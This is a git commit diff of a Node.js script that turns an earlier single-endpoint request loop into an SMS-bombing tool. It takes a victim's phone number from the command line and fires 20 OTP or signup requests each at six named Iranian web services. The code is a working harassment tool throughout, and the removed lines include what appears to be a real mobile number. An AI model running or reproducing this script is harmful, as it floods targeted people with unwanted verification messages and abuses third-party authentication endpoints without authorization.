884bd20e97335123b7a01b4b18c3fa7271ce7ebc
m.rezvani <mohsen.rezvani.rad33@gmail.com>
2023-07-13 13:30:36 +0330

    combine requests

--- requests.js
+++ requests.js
@@ -1,29 +1,88 @@
 const axios = require("axios");
 
-function sendRequests() {
-  const payload = new URLSearchParams();
-  payload.append("mobile", "09356202886");
-
-  const loopCount = 1000; // Change this to the desired number of requests
-
-  for (let i = 0; i < loopCount; i++) {
-    const requestConfig = {
-      url: "https://api.vesal.co/v2/auth/login",
-      method: "post",
-      data: payload,
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
+function sendRequests(mobileNo) {
+  const requests = [
+    {
+      url: "https://gharar.ir/users/phone_number/",
+      payload: {
+        phone: mobileNo,
       },
-    };
+      useFormData: false,
+    },
+    {
+      url: "https://api.digikala.com/v1/user/authenticate/",
+      payload: {
+        backUrl: "/",
+        username: mobileNo,
+        otp_call: false,
+      },
+      useFormData: false,
+    },
+    {
+      url: "https://auth.basalam.com/otp-request",
+      payload: {
+        mobile: mobileNo,
+        client_id: 23,
+      },
+      useFormData: false,
+    },
+    {
+      url: "https://gw.taaghche.com/v4/site/auth/signup",
+      payload: {
+        contact: mobileNo,
+      },
+      useFormData: false,
+    },
+    {
+      url: "https://gw.taaghche.com/v4/site/auth/login",
+      payload: {
+        contact: mobileNo,
+        forceOtp: false,
+      },
+      useFormData: false,
+    },
+    {
+      url: "https://api.vesal.co/v2/auth/login",
+      payload: new URLSearchParams({
+        mobile: mobileNo,
+      }),
+      useFormData: true,
+    },
+    // Add more objects here as needed
+  ];
 
-    axios(requestConfig)
-      .then((response) => {
-        console.log(`Request ${i + 1} successful. Response:`, response.data);
-      })
-      .catch((error) => {
-        // console.error(`Request ${i + 1} failed. Error:`, error.response.data);
-      });
+  const loopCount = 20; // Number of requests per object
+
+  for (let i = 0; i < requests.length; i++) {
+    const { url, payload, useFormData } = requests[i];
+
+    for (let j = 0; j < loopCount; j++) {
+      const requestConfig = {
+        url,
+        method: "post",
+        data: useFormData ? payload : JSON.stringify(payload),
+        headers: useFormData
+          ? { "Content-Type": "application/x-www-form-urlencoded" }
+          : { "Content-Type": "application/json" },
+      };
+
+      axios(requestConfig)
+        .then((response) => {
+          console.log(
+            `Request ${i + 1}-${j + 1} successful. Response:`,
+            response.data
+          );
+        })
+        .catch((error) => {});
+    }
   }
 }
 
-sendRequests();
+// Check if a mobile number is provided as a command-line argument
+const mobileNo = process.argv[2];
+if (!mobileNo) {
+  console.error("Please provide a mobile number as a command-line argument.");
+  process.exit(1);
+}
+
+sendRequests(mobileNo);
